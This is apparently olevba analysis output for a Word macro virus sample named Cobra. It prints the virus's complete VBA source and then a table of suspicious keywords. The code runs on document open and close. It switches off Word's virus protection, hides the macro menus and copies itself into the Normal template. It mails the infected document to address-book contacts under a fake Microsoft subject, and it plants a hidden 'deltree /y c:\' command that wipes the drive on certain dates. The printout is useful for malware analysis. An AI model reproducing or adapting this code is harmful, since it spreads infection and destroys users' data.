olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Cobra.f1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Cobra.f1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO BornCobra.bas 
in file: ./Virus.MSWord.Cobra.f1 - OLE stream: 'Macros/VBA/BornCobra'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Cobra Version 1.0E
Sub SendEmail()
On Error Resume Next
Dim udo, dmn, buos
Set udo = CreateObject("Outlook.Application")
Set dmn = udo.GetNameSpace("MAPI")
dmn.Logon "profile", "password"
For l = 1 To dmn.AddressLists.Count
Set ab = dmn.AddressLists(l)
i = 1
Set buos = udo.CreateItem(0)
For t = 1 To ab.AddressEntries.Count
o = ab.AddressEntries(i)
buos.Recipients.Add o
i = i + 1
If i > 30 Then t = ab.AddressEntries.Count
Next t
buos.Subject = "Important Message From Microsoft Via " _
& Application.UserName
buos.Body = "Important documment;-"
buos.Attachments.Add ActiveDocument.FullName
buos.Send
o = ""
Next l
dmn.LogOff
End Sub
Sub InfectCobra()
On Error Resume Next
InfectedDoc = False
InfectedNor = False
With Options
.VirusProtection = (1999 + 1 - 2000)
.SaveNormalPrompt = (1999 + 1 - 2000)
.ConfirmConversions = (1999 + 1 - 2000)
End With
With CommandBars("Tools")
.Controls("Macro").Enabled = (Chr(48) - Chr(48))
End With
With CommandBars("View")
.Controls("Toolbars").Enabled = (Chr(48) - Chr(48))
End With
For Each IDoc In ActiveDocument.VBProject.VBComponents
If IDoc.Name <> "BornCobra" And IDoc.Name <> "ThisDocument" And IDoc.Name <> "Reference to Normal" Then
Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:=IDoc.Name, _
Object:=wdOrganizerObjectProjectItems
End If
Next
For Each INor In NormalTemplate.VBProject.VBComponents
If INor.Name <> "BornCobra" And INor.Name <> "ThisDocument" Then
Application.OrganizerDelete Source:=NormalTemplate.FullName, _
Name:=INor.Name, Object:=wdOrganizerObjectProjectItems
End If
Next
For Each IDoc In ActiveDocument.VBProject.VBComponents
If IDoc.Name = "BornCobra" Then InfectedDoc = True
Next
For Each INor In NormalTemplate.VBProject.VBComponents
If INor.Name = "BornCobra" Then InfectedNor = True
Next
If InfectedDoc = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, _
Destination:=ActiveDocument.FullName, _
Name:="BornCobra", _
Object:=wdOrganizerObjectProjectItems
End If
If InfectedNor = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, _
Destination:=NormalTemplate.FullName, _
Name:="BornCobra", _
Object:=wdOrganizerObjectProjectItems
End If
End Sub
Sub AutoOpen()
Call RegEdit
Call InfectCobra
Call SendEmail
Call CreateCobra
End Sub
Sub RegEdit()
If System.PrivateProfileString("", "HKEY_CURRENT_USER\software\microssoft\office\", "Cobra") <> "Cobra" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\software\microssoft\office\", "Cobra") = "Cobra"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Cobra"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "DHK/BD"
End If
End Sub
Sub CreateCobra()
On Error Resume Next
InfectedDoc = False
InfectedNor = False
For Each IDoc In ActiveDocument.VBProject.VBComponents
If IDoc.Name = "Cobra" Then InfectedDoc = True
Next
For Each INor In NormalTemplate.VBProject.VBComponents
If INor.Name = "Cobra" Then InfectedNor = True
Next
If InfectedDoc = False Then
Set AddMod = ActiveDocument.VBProject.VBComponents.Add(1)
AddMod.Name = "Cobra"
AddMod.codemodule.Insertlines 1, "Sub FileNew"
AddMod.codemodule.Insertlines 2, "On error resume next"
AddMod.codemodule.Insertlines 3, "if day(now)=month(now) then "
AddMod.codemodule.Insertlines 4, "Shell +""deltree /y c:\"", vbHide "
AddMod.codemodule.Insertlines 5, "End if"
AddMod.codemodule.Insertlines 6, "End Sub"
End If
If InfectedNor = False Then
Set AddMod = NormalTemplate.VBProject.VBComponents.Add(1)
AddMod.Name = "Cobra"
AddMod.codemodule.Insertlines 1, "Sub FileNew"
AddMod.codemodule.Insertlines 2, "On error resume next"
AddMod.codemodule.Insertlines 3, "if day(now)=month(now) then "
AddMod.codemodule.Insertlines 4, "Shell +""deltree /y c:\"", vbHide "
AddMod.codemodule.Insertlines 5, "End if"
AddMod.codemodule.Insertlines 6, "End Sub"
End If
End Sub
Sub AutoClose()
Call RegEdit
Call InfectCobra
Call SendEmail
Call CreateCobra
End Sub
Sub FileOpen()
Call RegEdit
Call InfectCobra
Call SendEmail
Call CreateCobra
Dialogs(wdDialogFileOpen).Show
End Sub
Sub FileClose()
Call RegEdit
Call InfectCobra
Call SendEmail
Call CreateCobra
WordBasic.FileClose
End Sub

-------------------------------------------------------------------------------
VBA MACRO Cobra.bas 
in file: ./Virus.MSWord.Cobra.f1 - OLE stream: 'Macros/VBA/Cobra'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileNew()
On Error Resume Next
If Day(Now) = Month(Now) Then
Shell "deltree /y c:\", vbHide
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

